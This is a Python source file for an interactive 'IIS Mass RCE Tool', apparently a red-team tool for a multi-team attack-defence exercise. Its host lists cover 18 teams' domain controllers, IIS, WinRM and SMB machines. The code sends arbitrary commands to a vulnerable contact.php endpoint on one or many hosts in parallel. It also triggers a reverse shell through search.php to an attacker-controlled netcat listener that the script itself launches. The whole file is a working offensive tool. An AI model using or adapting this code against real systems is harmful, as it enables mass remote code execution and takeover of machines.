import requests
import time
import json
import subprocess
import threading
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from InquirerPy import inquirer
from InquirerPy.base.control import Choice

ALL_HOSTS = [
    # Team 1
    "192.168.1.3", "192.168.1.4", "10.1.1.1", "10.1.1.2", "10.1.1.3",
    
    # Team 2
    "192.168.2.3", "192.168.2.4", "10.2.1.1", "10.2.1.2", "10.2.1.3",
    
    # Team 3
    "192.168.3.3", "192.168.3.4", "10.3.1.1", "10.3.1.2", "10.3.1.3",
    
    # Team 4
    "192.168.4.3", "192.168.4.4", "10.4.1.1", "10.4.1.2", "10.4.1.3",
    
    # Team 5
    "192.168.5.3", "192.168.5.4", "10.5.1.1", "10.5.1.2", "10.5.1.3",
    
    # Team 6
    "192.168.6.3", "192.168.6.4", "10.6.1.1", "10.6.1.2", "10.6.1.3",
    
    # Team 7
    "192.168.7.3", "192.168.7.4", "10.7.1.1", "10.7.1.2", "10.7.1.3",
    
    # Team 8
    "192.168.8.3", "192.168.8.4", "10.8.1.1", "10.8.1.2", "10.8.1.3",
    
    # Team 9
    "192.168.9.3", "192.168.9.4", "10.9.1.1", "10.9.1.2", "10.9.1.3",
    
    # Team 10
    "192.168.10.3", "192.168.10.4", "10.10.1.1", "10.10.1.2", "10.10.1.3",
    
    # Team 11
    "192.168.11.3", "192.168.11.4", "10.11.1.1", "10.11.1.2", "10.11.1.3",
    
    # Team 12
    "192.168.12.3", "192.168.12.4", "10.12.1.1", "10.12.1.2", "10.12.1.3",
    
    # Team 13
    "192.168.13.3", "192.168.13.4", "10.13.1.1", "10.13.1.2", "10.13.1.3",
    
    # Team 14
    "192.168.14.3", "192.168.14.4", "10.14.1.1", "10.14.1.2", "10.14.1.3",
    
    # Team 15
    "192.168.15.3", "192.168.15.4", "10.15.1.1", "10.15.1.2", "10.15.1.3",
    
    # Team 16
    "192.168.16.3", "192.168.16.4", "10.16.1.1", "10.16.1.2", "10.16.1.3",
    
    # Team 17
    "192.168.17.3", "192.168.17.4", "10.17.1.1", "10.17.1.2", "10.17.1.3",
    
    # Team 18
    "192.168.18.3", "192.168.18.4", "10.18.1.1", "10.18.1.2", "10.18.1.3",
]

ALL_DC = [
    # Domain Controllers - typically the .1 addresses in 10.X.1. subnet
    "10.1.1.1", "10.2.1.1", "10.3.1.1", "10.4.1.1", "10.5.1.1",
    "10.6.1.1", "10.7.1.1", "10.8.1.1", "10.9.1.1", "10.10.1.1",
    "10.11.1.1", "10.12.1.1", "10.13.1.1", "10.14.1.1", "10.15.1.1",
    "10.16.1.1", "10.17.1.1", "10.18.1.1",
]

ALL_IIS = [
    # IIS Hosts - typically the 192.168.X.3 addresses
    "192.168.1.3", "192.168.2.3", "192.168.3.3", "192.168.4.3", "192.168.5.3",
    "192.168.6.3", "192.168.7.3", "192.168.8.3", "192.168.9.3", "192.168.10.3",
    "192.168.11.3", "192.168.12.3", "192.168.13.3", "192.168.14.3", "192.168.15.3",
    "192.168.16.3", "192.168.17.3", "192.168.18.3",
]

ALL_WINRM = [
    # WinRM Hosts - typically the 192.168.X.4 addresses
    "192.168.1.4", "192.168.2.4", "192.168.3.4", "192.168.4.4", "192.168.5.4",
    "192.168.6.4", "192.168.7.4", "192.168.8.4", "192.168.9.4", "192.168.10.4",
    "192.168.11.4", "192.168.12.4", "192.168.13.4", "192.168.14.4", "192.168.15.4",
    "192.168.16.4", "192.168.17.4", "192.168.18.4",
]

ALL_ICMP = [
    # ICMP Hosts - typically the 10.X.1.2 addresses
    "10.1.1.2", "10.2.1.2", "10.3.1.2", "10.4.1.2", "10.5.1.2",
    "10.6.1.2", "10.7.1.2", "10.8.1.2", "10.9.1.2", "10.10.1.2",
    "10.11.1.2", "10.12.1.2", "10.13.1.2", "10.14.1.2", "10.15.1.2",
    "10.16.1.2", "10.17.1.2", "10.18.1.2",
]

ALL_SMB = [
    # SMB Hosts - typically the 10.X.1.3 addresses
    "10.1.1.3", "10.2.1.3", "10.3.1.3", "10.4.1.3", "10.5.1.3",
    "10.6.1.3", "10.7.1.3", "10.8.1.3", "10.9.1.3", "10.10.1.3",
    "10.11.1.3", "10.12.1.3", "10.13.1.3", "10.14.1.3", "10.15.1.3",
    "10.16.1.3", "10.17.1.3", "10.18.1.3",
]

PORT = 8080
TIMEOUT = 60
CONCURRENCY = 8
THROTTLE_MS = 50

def get_all_local_ips():
    """Get all local IP addresses of the current machine"""
    local_ips = []
    
    try:
        # Get all network interfaces with names
        hostname = socket.gethostname()
        
        # Get all IP addresses associated with the hostname
        all_ips = socket.getaddrinfo(hostname, None)
        for addr_info in all_ips:
            ip = addr_info[4][0]
            if ip not in [ip_info[0] for ip_info in local_ips] and not ip.startswith('127.'):
                local_ips.append((ip, "Hostname Resolution"))
        
        # Also try to get IPs from network interfaces with names (if netifaces available)
        try:
            import netifaces
            interfaces = netifaces.interfaces()
            for interface in interfaces:
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for link in addrs[netifaces.AF_INET]:
                        ip = link['addr']
                        if ip not in [ip_info[0] for ip_info in local_ips] and not ip.startswith('127.'):
                            # Try to get interface description
                            interface_name = interface
                            # Common interface names mapping
                            if interface.startswith('eth'):
                                interface_name = f"Ethernet {interface[3:]}"
                            elif interface.startswith('wlan') or interface.startswith('wlp'):
                                interface_name = f"WiFi {interface[4:]}"
                            elif interface.startswith('en'):
                                interface_name = f"Ethernet {interface[2:]}"
                            elif interface.startswith('tailscale'):
                                interface_name = "Tailscale VPN"
                            elif interface.startswith('tun'):
                                interface_name = f"VPN Tunnel {interface[3:]}"
                            elif interface.startswith('docker'):
                                interface_name = "Docker Network"
                            elif interface == 'lo':
                                interface_name = "Loopback"
                            
                            local_ips.append((ip, interface_name))
        except ImportError:
            pass  # netifaces not available
        
    except:
        pass
    
    # Fallback methods
    try:
        # Try connecting to external service to get outgoing IP
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            outgoing_ip = s.getsockname()[0]
            if outgoing_ip not in [ip_info[0] for ip_info in local_ips]:
                local_ips.append((outgoing_ip, "Outgoing Connection"))
    except:
        pass
    
    # Add localhost as last resort
    if not local_ips:
        local_ips.append(("127.0.0.1", "Localhost"))
    else:
        # Ensure localhost is included
        if "127.0.0.1" not in [ip_info[0] for ip_info in local_ips]:
            local_ips.append(("127.0.0.1", "Localhost"))
    
    return local_ips

def select_local_ip():
    """Let user select which local IP to use"""
    local_ips = get_all_local_ips()
    
    if not local_ips:
        return "127.0.0.1"
    
    if len(local_ips) == 1:
        return local_ips[0][0]
    
    # Create choices for each IP with interface names
    choices = []
    for ip, interface_name in local_ips:
        # Add description based on IP type
        if ip.startswith('10.') or ip.startswith('192.168.') or (ip.startswith('172.') and 16 <= int(ip.split('.')[1]) <= 31):
            network_type = "Private"
        elif ip.startswith('127.'):
            network_type = "Loopback"
        elif ip.startswith('169.254.'):
            network_type = "Link-local"
        else:
            network_type = "Public"
        
        choices.append(Choice(
            value=ip, 
            name=f"{ip} - {interface_name} ({network_type})"
        ))
    
    # Add exit option
    choices.append(Choice(value=None, name="Exit"))
    
    print("\n=== Network Interface Selection ===")
    selected_ip = inquirer.select(
        message="Select network interface to use:",
        choices=choices,
        default=choices[0].value if choices else None
    ).execute()
    
    if selected_ip is None:
        print("Exiting...")
        exit(0)
    
    return selected_ip

def send_command(client, port, command):
    url = f"http://{client}:{port}/contact.php"
    
    # Send as form data
    data = {"input_word": command}
    
    try:
        # Using form data approach
        r = requests.post(url, data=data, timeout=TIMEOUT)
        
        return (client, r.status_code, r.text[:500])  # Increased response preview
    except Exception as e:
        return (client, "ERR", str(e))
        
def spawn_reverse_shell(client, port, attacker_ip, attacker_port):
    url = f"http://{client}:{port}/search.php"
    command = f"search {attacker_ip} {attacker_port}"
    data = {"input_word": command}
    
    try:
        # Use a very short timeout - we just need to trigger the request
        r = requests.post(url, data=data, timeout=2)
        # If we get here, we got an HTTP response (unexpected for reverse shell)
        return (client, r.status_code, "Reverse Shell Triggered")
    except requests.exceptions.Timeout:
        # Timeout is EXPECTED - this means the reverse shell is running
        return ("SUCCESS", "Reverse shell connected (timeout expected)")
    except Exception as e:
        return ("ERR", str(e))
        
def start_listener(ip, port):
    def listener():
        try:
            subprocess.run(f"nc -l {ip} {port}", shell=True)
        except Exception as e:
            print(f"Listener error: {e}")
    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    return thread
    
def main_interface():
    action = inquirer.select(
        message="Select an action:",
        choices=[
            Choice(value="SINGULAR", name="Singular Remote Code Execution"),
            Choice(value="MASS", name="Mass Remote Code Execution"),
            Choice(value="SHELL", name="Spawn a Reverse Shell"),
            Choice(value=None, name="Exit"),
        ],
        default="SINGULAR",
    ).execute()
    return action
    
def choose_targets():
    choice = inquirer.select(
        message="Which group would you like to target?",
        choices=[
            Choice(value="ALL_HOSTS", name="All Hosts"),
            Choice(value="ALL_DC", name="All Domain Controllers"),
            Choice(value="ALL_IIS", name="All IIS Hosts"),
            Choice(value="ALL_WINRM", name="All WinRM Hosts"),
            Choice(value="ALL_ICMP", name="All ICMP Hosts"),
            Choice(value="ALL_SMB", name="All SMB Hosts"),
            Choice(value="CUSTOM", name="Custom (Enter Comma-Separated List)"),
            Choice(value=None, name="Cancel"),
        ],
    ).execute()
    
    if not choice:
        return []

    if choice == "CUSTOM":
        while True:
            text = inquirer.text(message="Enter Comma-Separated Targets (e.g. 192.168.1.1,192.168.1.2):").execute()
            if not text:
                return []
            
            targets = [t.strip() for t in text.split(",") if t.strip()]
            
            # Validate all IPs are in ALL_HOSTS
            invalid_ips = [ip for ip in targets if ip not in ALL_HOSTS]
            
            if invalid_ips:
                print(f"❌ Invalid target IPs: {', '.join(invalid_ips)}")
                retry = inquirer.confirm(
                    message="Would you like to try again?", 
                    default=True
                ).execute()
                if not retry:
                    return []
            else:
                return targets

    mapping = {
        "ALL_HOSTS": ALL_HOSTS,
        "ALL_DC": ALL_DC,
        "ALL_IIS": ALL_IIS,
        "ALL_WINRM": ALL_WINRM,
        "ALL_ICMP": ALL_ICMP,
        "ALL_SMB": ALL_SMB,
    }
    return mapping.get(choice, [])
    
def run_threads(clients, port, command, action_type="command", attacker_ip=None, attacker_port=None):
    print(f"\nExecuting on {len(clients)} targets...")
    print("=" * 50)
    
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        futures = []
        for client in clients:
            if action_type == "command":
                # Send command to each client with throttling
                futures.append(ex.submit(send_command, client, port, command))
            elif action_type == "shell":
                # Use the provided attacker IP and port
                futures.append(ex.submit(spawn_reverse_shell, client, port, attacker_ip, attacker_port))
                
            time.sleep(THROTTLE_MS / 1000.0)
            
        completed = 0
        for fut in as_completed(futures):
            target, status, response = fut.result()
            print(f"[{completed+1}/{len(clients)}] {target} -> {status}")
            if status == 200 and action_type == "command":
                print(f"Response: {response}")
            print("-" * 30)
            completed += 1

def singular_execution():
    while True:
        target = inquirer.text(message="Enter target IP:").execute()
        
        if not target:
            print("No target specified")
            return
        
        # Check if target is in ALL_HOSTS
        if target not in ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=True
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    command = inquirer.text(message="Enter command to execute:").execute()
    
    if not command:
        print("No command specified")
        return
    
    print(f"\nSending command to {target}...")
    result = send_command(target, PORT, command)
    target, status, response = result
    print(f"Target: {target}")
    print(f"Status: {status}")
    print(f"Response:\n{response}")

def mass_execution():
    targets = choose_targets()
    if not targets:
        print("No targets selected")
        return
    
    command = inquirer.text(message="Enter command to execute on all targets:").execute()
    if not command:
        print("No command entered")
        return
    
    print(f"\nTargeting {len(targets)} hosts with command: {command}")
    confirm = inquirer.confirm(message="Proceed?", default=True).execute()
    if not confirm:
        return
    
    run_threads(targets, PORT, command, "command")

def shell_execution(selected_ip):
    # For shell spawning, only allow single target selection
    print("\n=== Reverse Shell Setup ===")
    
    # Get single target
    while True:
        target = inquirer.text(message="Enter target IP:").execute()
        
        if not target:
            print("No target specified")
            return
        
        # Check if target is in ALL_HOSTS
        if target not in ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=True
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    # Get listener details
    listener_ip = inquirer.text(message="Listener IP:", default=selected_ip).execute()
    listener_port = inquirer.text(message="Listener port:", default="6767").execute()
    
    confirm = inquirer.confirm(
        message=f"Trigger reverse shell from {target} to {listener_ip}:{listener_port}?", 
        default=True
    ).execute()
    
    if not confirm:
        return
    
    # Start listener
    print(f"Starting listener on {listener_ip}:{listener_port}...")
    listener_thread = start_listener(listener_ip, listener_port)
    time.sleep(1)
    
    # Trigger the reverse shell
    print(f"Triggering reverse shell on {target}...")
    status, response = spawn_reverse_shell(target, PORT, listener_ip, listener_port)
    
    if status in ["SUCCESS", 200]:  # Check for both SUCCESS and 200
        try:
            listener_thread.join()
        except KeyboardInterrupt:
            print("\nStopped by user")
    else:
        print("❌ Failed to trigger reverse shell")
        print(f"Provided Error: {response}")
        listener_thread.join(timeout=1)

def main():
    print("=== IIS Mass RCE Tool ===")
    print("Advanced Remote Code Execution and Reverse Shell Deployment")
    
    # Show local IP at startup
    selected_ip = select_local_ip()
    print(f"Selected IP: {selected_ip}")
    print()
    
    while True:
        action = main_interface()
        if action is None:
            print("Goodbye.")
            break
            
        if action == "SINGULAR":
            singular_execution()
        elif action == "MASS":
            mass_execution()
        elif action == "SHELL":
            shell_execution(selected_ip)
        else:
            print("Unknown action, returning to menu.")
        
        print()  # Empty line for readability

if __name__ == "__main__":
    main()
